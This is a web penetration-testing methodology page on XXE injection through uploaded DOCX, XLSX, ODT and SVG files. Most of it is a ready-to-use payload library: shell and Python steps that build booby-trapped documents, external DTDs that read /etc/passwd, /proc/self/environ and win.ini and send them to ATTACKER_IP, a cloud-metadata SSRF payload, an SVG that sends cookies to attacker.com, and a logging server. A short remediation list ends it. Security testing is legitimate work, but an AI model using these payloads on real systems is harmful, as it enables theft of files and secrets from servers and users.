---
title: "XXE via Binary Formats (DOCX, XLSX, SVG, ODT)"
date: 2026-02-24
draft: false
---

# XXE via Binary Formats (DOCX, XLSX, SVG, ODT)

> **Severity**: High–Critical | **CWE**: CWE-611
> **OWASP**: A05:2021 – Security Misconfiguration

---

## What Is XXE via Binary Formats?

XML External Entity injection isn't limited to endpoints that explicitly accept XML. Many modern file formats are ZIP archives containing XML files — Office Open XML (DOCX, XLSX, PPTX), OpenDocument (ODT, ODS), EPUB, JAR/WAR — and are processed server-side by import features, preview generators, or document converters. Any of these can trigger XXE if the server-side XML parser has external entities enabled.

**Attack vector summary**:
```
DOCX/XLSX/PPTX → ZIP archive → XML files inside → inject XXE into XML → upload → server processes → OOB/LFI
SVG → XML format → browser/server renders → XXE if server-side render (wkhtmltopdf, ImageMagick)
ODT/ODS → OpenDocument XML → server-side document processor
```

---

## Discovery Checklist

**Phase 1 — Find Processing Endpoints**
- [ ] File import features: import contacts (VCF/CSV), import spreadsheet (XLSX), import document (DOCX)
- [ ] Document preview/conversion (DOCX→PDF, XLSX→PDF, SVG→PNG)
- [ ] Profile picture/avatar upload (SVG accepted?)
- [ ] Report export that then re-imports user data
- [ ] API endpoints accepting `multipart/form-data` with document files
- [ ] Mail import (MSG/EML files contain XML metadata)

**Phase 2 — Determine Processing Library**
- [ ] Error messages: Apache POI (Java), python-docx, LibreOffice, OpenXML SDK (.NET), phpoffice
- [ ] SSRF via document: load a URL → check if server fetches it (OOB DNS/HTTP)
- [ ] Response timing: include large file → longer response → confirms file reading

**Phase 3 — Exploit**
- [ ] OOB blind via DTD on external server
- [ ] Local file read via error-based (file not found → includes path/content in error)
- [ ] SSRF: point entity to internal service

---

## Payload Library

### Payload 1 — Malicious DOCX (Word Document)

```bash
# DOCX structure: ZIP archive with XML files
# Target XML: word/document.xml (main document body)
# Also: [Content_Types].xml, word/_rels/document.xml.rels

# Step 1: Create base legitimate DOCX (or use any DOCX):
cp legitimate.docx exploit.docx

# Step 2: Unzip:
mkdir docx_exploit && cp exploit.docx docx_exploit/
cd docx_exploit && unzip exploit.docx -d extracted/

# Step 3: Modify word/document.xml — add DOCTYPE with XXE:
cat > extracted/word/document.xml << 'XMLEOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE doc [
  <!ENTITY % dtd SYSTEM "http://ATTACKER_IP:8888/evil.dtd">
  %dtd;
]>
<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas"
            xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>
  <w:p><w:r><w:t>Test</w:t></w:r></w:p>
  <w:sectPr/>
</w:body>
</w:document>
XMLEOF

# Step 4: Repack as DOCX:
cd extracted && zip -r ../exploit.docx . && cd ..

# External DTD server (attacker's server):
cat > evil.dtd << 'DTDEOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:8888/?x=%file;'>">
%eval;
%exfil;
DTDEOF

# Start HTTP server to receive:
python3 -m http.server 8888

# Upload exploit.docx to target's import endpoint
# Monitor HTTP server for incoming requests with file content
```

### Payload 2 — Malicious XLSX (Excel Spreadsheet)

```bash
# XLSX structure: ZIP archive with XML files
# Key XML files: xl/workbook.xml, xl/worksheets/sheet1.xml, [Content_Types].xml

mkdir xlsx_exploit
cp legitimate.xlsx xlsx_exploit/ 2>/dev/null || \
  python3 -c "
import zipfile
# Create minimal XLSX structure:
with zipfile.ZipFile('xlsx_exploit/exploit.xlsx', 'w') as z:
    z.writestr('[Content_Types].xml', '''<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>
<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">
  <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>
  <Default Extension=\"xml\" ContentType=\"application/xml\"/>
  <Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml\"/>
  <Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/>
</Types>''')
    z.writestr('_rels/.rels', '''<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>
<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">
  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/>
</Relationships>''')
"

# Inject XXE into xl/workbook.xml:
cat > xl/workbook.xml << 'XMLEOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE workbook [
  <!ENTITY % dtd SYSTEM "http://ATTACKER_IP:8888/evil.dtd">
  %dtd;
]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
  </sheets>
</workbook>
XMLEOF

# Alternatively inject into [Content_Types].xml:
cat > '[Content_Types].xml' << 'XMLEOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE Types [
  <!ENTITY % dtd SYSTEM "http://ATTACKER_IP:8888/evil.dtd">
  %dtd;
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
</Types>
XMLEOF
```

### Payload 3 — SVG XXE (Most Direct Attack Vector)

```xml
<!-- SVG is XML — directly inject XXE in SVG file -->
<!-- Works when: server renders SVG, converts SVG to PNG/PDF, displays it -->

<!-- Basic in-band XXE (if output returned): -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="20" font-size="10">&xxe;</text>
</svg>

<!-- OOB XXE via external DTD: -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % dtd SYSTEM "http://ATTACKER_IP:8888/evil.dtd">
  %dtd;
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="40"/>
</svg>

<!-- SSRF via SVG (load internal URL): -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="&ssrf;" x="0" y="0" height="100" width="100"/>
</svg>

<!-- SVG with XSS (if served same-origin after upload): -->
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/?c='+document.cookie)">
  <circle cx="50" cy="50" r="40"/>
</svg>

<!-- SVG via wkhtmltopdf / Puppeteer / headless browser: -->
<!-- If file:// URIs are allowed in rendering: -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY passwd SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&passwd;</text>
</svg>
```

### Payload 4 — External DTD Server (OOB Exfiltration)

```bash
# Host this on your HTTP server (ATTACKER_IP:8888):

# evil.dtd — basic file exfil:
cat > /tmp/server/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:8888/?x=%file;'>">
%eval;
%exfil;
EOF

# evil.dtd — read /proc/self/environ (may contain secrets):
cat > /tmp/server/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///proc/self/environ">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:8888/?env=%file;'>">
%eval;
%exfil;
EOF

# evil.dtd — Windows targets:
cat > /tmp/server/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:8888/?win=%file;'>">
%eval;
%exfil;
EOF

# Start logging server:
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print('RECEIVED:', urllib.parse.unquote(self.path))
        self.send_response(200)
        self.end_headers()
        # Serve evil.dtd for / requests:
        if 'evil.dtd' in self.path:
            with open('/tmp/server/evil.dtd', 'rb') as f:
                self.wfile.write(f.read())

HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
"
```

### Payload 5 — ODT / OpenDocument Format

```bash
# ODT = ZIP archive with XML
# Key file: content.xml

mkdir odt_exploit
cat > content.xml << 'XMLEOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE office:document-content [
  <!ENTITY % dtd SYSTEM "http://ATTACKER_IP:8888/evil.dtd">
  %dtd;
]>
<office:document-content
  xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
  xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">
  <office:body>
    <office:text>
      <text:p>Test document</text:p>
    </office:text>
  </office:body>
</office:document-content>
XMLEOF

# Also inject in meta.xml for metadata XXE:
cat > meta.xml << 'XMLEOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE office:document-meta [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8888/evil.dtd">
  %xxe;
]>
<office:document-meta xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0">
  <office:meta/>
</office:document-meta>
XMLEOF

# Pack as ODT:
zip -r exploit.odt content.xml meta.xml mimetype META-INF/
```

### Payload 6 — Python Automation Script

```python
#!/usr/bin/env python3
"""
XXE injection into DOCX/XLSX/ODT files
Usage: python3 xxe_binary.py <template.docx> <attacker_ip> <attacker_port>
"""
import zipfile, shutil, os, sys

def inject_xxe_docx(template, attacker_ip, port, output="exploit.docx"):
    dtd_url = f"http://{attacker_ip}:{port}/evil.dtd"

    xxe_xml = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE doc [
  <!ENTITY % dtd SYSTEM "{dtd_url}">
  %dtd;
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body><w:p><w:r><w:t>XXE Test</w:t></w:r></w:p><w:sectPr/></w:body>
</w:document>"""

    shutil.copy(template, output)
    with zipfile.ZipFile(output, 'a') as z:
        z.writestr("word/document.xml", xxe_xml)
    print(f"[+] Created {output}")
    print(f"[+] Host evil.dtd at {dtd_url}")

def inject_xxe_svg(attacker_ip, port, target_file="/etc/passwd", output="exploit.svg"):
    dtd_url = f"http://{attacker_ip}:{port}/evil.dtd"
    svg = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % dtd SYSTEM "{dtd_url}">
  %dtd;
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" fill="red"/>
</svg>"""
    with open(output, 'w') as f:
        f.write(svg)
    print(f"[+] Created {output}")

if __name__ == "__main__":
    if len(sys.argv) >= 3:
        inject_xxe_docx(sys.argv[1], sys.argv[2],
                        sys.argv[3] if len(sys.argv) > 3 else "8888")
    inject_xxe_svg(sys.argv[2] if len(sys.argv) > 1 else "ATTACKER_IP", "8888")
```

---

## Tools

```bash
# XXEinjector — automated XXE exploitation including OOB:
git clone https://github.com/enjoiz/XXEinjector
# For DOCX uploads:
ruby XXEinjector.rb --host=ATTACKER_IP --path=/etc/passwd --file=request.txt --oob=http

# xxeftp — exfil via FTP (bypasses HTTP chunking issues with multiline files):
# Use FTP protocol in external entity for better multiline exfil:
# evil.dtd:
# <!ENTITY % file SYSTEM "file:///etc/passwd">
# <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://ATTACKER_IP:2121/?x=%file;'>">

# Python FTP server for exfil:
pip3 install pyftpdlib
python3 -m pyftpdlib -p 2121 -w -d /tmp/xxe_exfil/

# Burp Collaborator:
# Use collaborator URL in DTD system identifier
# Monitor for incoming DNS + HTTP with file content

# interactsh:
interactsh-client -v
# Use generated URL as ATTACKER_IP in DTD

# Create malicious XLSX quickly with Python openpyxl:
python3 -c "
import openpyxl
wb = openpyxl.Workbook()
wb.save('/tmp/base.xlsx')
"
# Then modify internals via unzip

# Detect XXE processing from server response timing:
# Include large local file (e.g., /var/log/syslog) → response takes longer → confirms OOB

# Test SVG upload XSS:
echo '<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"><circle/></svg>' > xss.svg
curl -X POST https://target.com/avatar -F "file=@xss.svg" -b "session=VAL"
```

---

## Remediation Reference

- **Disable external entity processing** in XML parsers used for document processing: `FEATURE_EXTERNAL_GENERAL_ENTITIES = false`, `FEATURE_EXTERNAL_PARAMETER_ENTITIES = false`
- **Apache POI (Java)**: use `XMLInputFactory` with all external entity features disabled
- **LibreOffice/headless**: update to latest; use `--safe-mode`; restrict network access from document rendering
- **SVG**: do not render SVG server-side using XML parsers with XXE-capable libraries; sanitize SVG with DOMPurify before processing
- **Allowlist accepted file types**: validate MIME type AND file signature; reject SVG for avatar uploads if not required
- **Sandbox document processing**: run document converters in isolated containers without network access and read-only filesystem
- **php-xml**: disable `LIBXML_NOENT` and `LIBXML_DTDLOAD` flags when parsing any uploaded XML-based files

*Part of the Web Application Penetration Testing Methodology series.*
